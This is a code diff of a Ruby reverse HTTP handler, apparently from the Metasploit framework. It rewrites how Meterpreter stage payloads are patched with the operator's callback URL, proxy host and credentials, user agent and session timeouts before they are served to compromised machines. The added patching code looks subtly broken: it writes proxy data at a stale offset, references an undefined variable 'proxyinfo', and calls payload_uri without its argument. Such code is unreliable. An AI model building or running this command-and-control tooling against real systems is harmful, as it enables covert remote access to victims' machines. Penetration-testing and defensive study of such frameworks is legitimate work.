@@ -58,18 +58,12 @@ module ReverseHttp
       ], Msf::Handler::ReverseHttp)
   end
 
-  # Toggle for IPv4 vs IPv6 mode
-  #
-  def ipv6?
-    Rex::Socket.is_ipv6?(datastore['LHOST'])
-  end
-
   # Determine where to bind the server
   #
   # @return [String]
   def listener_address
-    if datastore['ReverseListenerBindAddress'].to_s.empty?
-      bindaddr = (ipv6?) ? '::' : '0.0.0.0'
+    if datastore['ReverseListenerBindAddress'].to_s == ""
+      bindaddr = Rex::Socket.is_ipv6?(datastore['LHOST']) ? '::' : '0.0.0.0'
     else
       bindaddr = datastore['ReverseListenerBindAddress']
     end
@@ -77,14 +71,12 @@ module ReverseHttp
     bindaddr
   end
 
+  # Return a URI suitable for placing in a payload
+  #
   # @return [String] A URI of the form +scheme://host:port/+
   def listener_uri
-    if ipv6?
-      listen_host = "[#{listener_address}]"
-    else
-      listen_host = listener_address
-    end
-    "#{scheme}://#{listen_host}:#{datastore['LPORT']}/"
+    uri_host = Rex::Socket.is_ipv6?(listener_address) ? "[#{listener_address}]" : listener_address
+    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
   end
 
   # Return a URI suitable for placing in a payload.
@@ -95,13 +87,13 @@ module ReverseHttp
   # @return [String] A URI of the form +scheme://host:port/+
   def payload_uri(req)
     if req and req.headers and req.headers['Host'] and not datastore['OverrideRequestHost']
-      callback_host = req.headers['Host']
-    elsif ipv6?
-      callback_host = "[#{datastore['LHOST']}]:#{datastore['LPORT']}"
+      uri_host = req.headers['Host']
+    elsif Rex::Socket.is_ipv6?(datastore['LHOST'])
+      uri_host = "[#{datastore['LHOST']}]:#{datastore['LPORT']}"
     else
-      callback_host = "#{datastore['LHOST']}:#{datastore['LPORT']}"
+      uri_host = "#{datastore['LHOST']}:#{datastore['LPORT']}"
     end
-    "#{scheme}://#{callback_host}/"
+    "#{scheme}://#{uri_host}/"
   end
 
   # Use the {#refname} to determine whether this handler uses SSL or not
@@ -158,6 +150,7 @@ module ReverseHttp
       'VirtualDirectory' => true)
 
     print_status("Started #{scheme.upcase} reverse handler on #{listener_uri}")
+    lookup_proxy_settings
   end
 
   #
@@ -174,6 +167,45 @@ module ReverseHttp
   attr_accessor :service # :nodoc:
 
 protected
+
+  #
+  # Parses the proxy settings and returns a hash
+  #
+  def lookup_proxy_settings
+    info = {}
+    return @proxy_settings if @proxy_settings
+
+    if datastore['PROXY_HOST'].to_s == ""
+      @proxy_settings = info
+      return @proxy_settings
+    end
+
+    info[:host] = datastore['PROXY_HOST'].to_s
+    info[:port] = (datastore['PROXY_PORT'] || 8080).to_i
+    info[:type] = datastore['PROXY_TYPE'].to_s
+
+    uri_host = info[:host]
+
+    if Rex::Socket.is_ipv6?(uri_host)
+      uri_host = "[#{info[:host]}]"
+    end
+
+    info[:info] = "#{uri_host}:#{info[:port]}"
+
+    if info[:type] == "SOCKS"
+      info[:info] = "socks=#{info[:info]}"
+    else
+      info[:info] = "http://#{info[:info]}"
+      if datastore['PROXY_USERNAME'].to_s != ""
+        info[:username] = datastore['PROXY_USERNAME'].to_s
+      end
+      if datastore['PROXY_PASSWORD'].to_s != ""
+        info[:password] = datastore['PROXY_PASSWORD'].to_s
+      end
+    end
+
+    @proxy_settings = info
+  end
 
   #
   # Parses the HTTPS request
@@ -204,9 +236,8 @@ protected
         blob.sub!('HTTP_COMMUNICATION_TIMEOUT = 300', "HTTP_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
         blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")
 
-        unless datastore['PROXYHOST'].blank?
-          proxy_url = "http://#{datastore['PROXYHOST']}:#{datastore['PROXYPORT']}"
-          blob.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
+        if @proxy_settings[:host]
+          blob.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(@proxy_settings[:info])}'")
         end
 
         resp.body = blob
@@ -259,20 +290,62 @@ protected
 
         blob = obj.stage_payload
 
-        #
-        # Patch options into the payload
-        #
-        Rex::Payloads::Meterpreter::Patch.patch_passive_service! blob,
-          :ssl            => ssl?,
-          :url            => url,
-          :expiration     => datastore['SessionExpirationTimeout'],
-          :comm_timeout   => datastore['SessionCommunicationTimeout'],
-          :ua             => datastore['MeterpreterUserAgent'],
-          :proxyhost      => datastore['PROXYHOST'],
-          :proxyport      => datastore['PROXYPORT'],
-          :proxy_type     => datastore['PROXY_TYPE'],
-          :proxy_username => datastore['PROXY_USERNAME'],
-          :proxy_password => datastore['PROXY_PASSWORD']
+        # Replace the user agent string with our option
+        i = blob.index("METERPRETER_UA\x00")
+        if i
+          str = datastore['MeterpreterUserAgent'][0,255] + "\x00"
+          blob[i, str.length] = str
+          print_status("Patched user-agent at offset #{i}...")
+        end
+
+        # Activate a custom proxy
+        if blob.index("METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00") && @proxy_settings[:info]
+          proxy_info = @proxy_settings[:info] + "\x00"
+
+          blob[i, proxy_info.length] = proxy_info
+          print_status("Activated custom proxy #{proxyinfo}, patch at offset #{i}...")
+
+          # Optional authentication
+          if @proxy_settings[:username] && @proxy_settings[:password]
+            proxy_username_loc = blob.index("METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+            proxy_username = @proxy_settings[:username] + "\x00"
+            blob[proxy_username_loc, proxy_username.length] = proxy_username
+
+            proxy_password_loc = blob.index("METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+            proxy_password = @proxy_settings[:password] + "\x00"
+            blob[proxy_password_loc, proxy_password.length] = proxy_password
+          end
+        end
+
+        # Replace the transport string first (TRANSPORT_SOCKET_SSL)
+        i = blob.index("METERPRETER_TRANSPORT_SSL")
+        if i
+          str = "METERPRETER_TRANSPORT_HTTP#{ssl? ? "S" : ""}\x00"
+          blob[i, str.length] = str
+        end
+        print_status("Patched transport at offset #{i}...")
+
+        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
+        i = blob.index("https://" + ("X" * 256))
+        if i
+          url = payload_uri + conn_id + "/\x00"
+          blob[i, url.length] = url
+        end
+        print_status("Patched URL at offset #{i}...")
+
+        i = blob.index([0xb64be661].pack("V"))
+        if i
+          str = [ datastore['SessionExpirationTimeout'] ].pack("V")
+          blob[i, str.length] = str
+        end
+        print_status("Patched Expiration Timeout at offset #{i}...")
+
+        i = blob.index([0xaf79257f].pack("V"))
+        if i
+          str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
+          blob[i, str.length] = str
+        end
+        print_status("Patched Communication Timeout at offset #{i}...")
 
         resp.body = encode_stage(blob)
 
